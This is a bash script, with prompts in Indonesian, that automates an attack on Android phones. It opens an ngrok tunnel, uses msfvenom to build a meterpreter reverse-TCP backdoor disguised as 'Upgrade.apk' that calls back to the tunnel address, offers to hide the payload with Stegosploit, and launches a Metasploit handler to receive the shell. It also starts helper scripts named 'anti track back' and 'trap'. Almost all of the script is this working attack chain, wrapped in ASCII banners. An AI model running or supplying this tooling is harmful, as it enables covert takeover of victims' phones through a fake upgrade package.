#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
hackbae(){
echo "  _    _            _      ____              "
sleep 0.03
echo " | |  | |          | |    |  _ \             "
sleep 0.03
echo " | |__| | __ _  ___| | __ | |_) | __ _  ___  "
sleep 0.03
echo " |  __  |/ _' |/ __| |/ / |  _ < / _' |/ _ \ "
sleep 0.03
echo " | |  | | (_| | (__|   <  | |_) | (_| |  __/ "
sleep 0.03
echo " |_|  |_|\__,_|\___|_|\_\ |____/ \__,_|\___| "
sleep 0.03
echo                                         
}                                            
paladin(){
echo "            ,             /@@@@@=-"
sleep 0.03
echo "            \\\            @@@@@@@@@@=-"
sleep 0.03
echo "             \\\          _\@/\@@@@@=-"
sleep 0.03
echo "              \\\        /_ +\ \@@@@@=-"
sleep 0.03
echo "        ,      \\\      (_/   )  \@@@@=-"
sleep 0.03
echo "        \\\      \\\     (_____)    \@@=-"
sleep 0.03
echo "        _\\\_/\\_ _\\\__  /     \     ~~"
sleep 0.03
echo "  ____,/+-  '/\\\  { \_|___(__ ) "
sleep 0.03
echo " >             \\\  )_|/  ___  \\\ "
sleep 0.03
echo " \_//--\\___/    \\\.' / <-q-p-> \\\ "
sleep 0.03
echo "    _//   )      \\\(\\/\\ <-d-b-> /___"
sleep 0.03
echo "   _____  /         \\\/ \  \|/  //   \__"
sleep 0.03
echo "  /     \/          /   \_____//     \_\ "
sleep 0.03
echo " | /\_  |         (_  /______\\     |||"
sleep 0.03
echo " | \_ | |         | \|   <    \\    /||"
sleep 0.03
echo " \_\_\ \/     ____\  |____\    \)  / ||"
sleep 0.03
echo "       /    _/  <____)\    (      / //\\"
sleep 0.03
echo "      /   _/           \    \    (  \\//"
sleep 0.03
echo "     (   /              )  / \    \  \/"
sleep 0.03
echo "     /  /              /  /   \    )"
sleep 0.03
echo " ---/  /   Paladin ---/  /-----)  /-----"
sleep 0.03
echo "  _/__/   Project!  _/__/     /  /"
sleep 0.03
echo " /__/              /__/     _/__/"
sleep 0.03
echo "                           /__/"
echo " ======================================="
echo " ==         Paladin Project           =="
echo " ======================================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
clear
echo "Loading.."
load
clear
hackbae
echo "============================================"                                            
echo "==    Selamat datang di Paladin Project   =="
echo "============================================"   
echo " Mulai Paladin Project?"
echo "y/n?"
read start
if [ $start = "y" ]; then
    clear
    echo "Memulai Paladin Project"
    echo "Loading.."
    load
    clear
    paladin
#anti trackback tcp
    echo
    echo "Starting Anti Trackback"
    sleep 3
    gnome-terminal -x bash -c "$HOME/paladin_project/anti_track_back.sh; exec bash"
#trap project
    echo
    echo "Starting Trap Project"
    sleep 3
    gnome-terminal -x bash -c "$HOME/paladin_project/trap.sh; exec bash"
#paladin auto exploit
    echo
    echo "Start Paladin Auto exploit?"
    echo "y/n?"
    read paladin_auto
    if [ $paladin_auto = "y" ]; then
        echo "Memulai auto exploit"
        gnome-terminal -x bash -c "$HOME/paladin_project/ngrok tcp 4444; exec bash"
#ambil IP & Port Ngrok
        gnome-terminal -x ping "0.tcp.ngrok.io"        
        echo
        echo "Masukan IP Ngrok"
        read ip_ngrok
        echo
        echo "Masukan Port Ngrok"
        read port_ngrok
        echo "===================================="        
        echo "  Membuat Backdoor Menggunakan  "
        echo "  IP   :$ip_ngrok               "
        echo "  Port :$port_ngrok             "
        echo "===================================="
        echo
        sleep 3
        gnome-terminal -x msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_ngrok LPORT=$port_ngrok -o Upgrade.apk
        sleep 5
        echo "Backdoor berhasil dibuat"        
        echo
        echo "Gunakan Stegosploit?"
        echo "y/n"
        read start_stegosploit
        if [ $start_stegosploit = "y" ]; then
            gnome-terminal -x bash -c "$HOME/paladin_project/stegosploit.sh; exec bash"
            echo "Start Metasploit sekarang?"
            echo "y/n?"
            read start_metasploit
            if [ $start_metasploit = "y" ]; then
                clear
                echo "Loading.."
                load
                clear
                paladin
                echo "Memulai Metasploit"
                echo
#auto metasploit pakai ngrok WAN
                msfconsole -q -x "use exploit/multi/handler;
                set payload android/meterpreter/reverse_tcp;
                set lhost 0.0.0.0;
                set lport 4444;
                exploit"
            else
                echo "Kesalahan"
            fi
        else
            echo "Kesalahan"
        fi
    else
        echo "Kesalahan"
    fi
else
    echo "Terimakasih sudah menggunakan Paladin Project"
fi
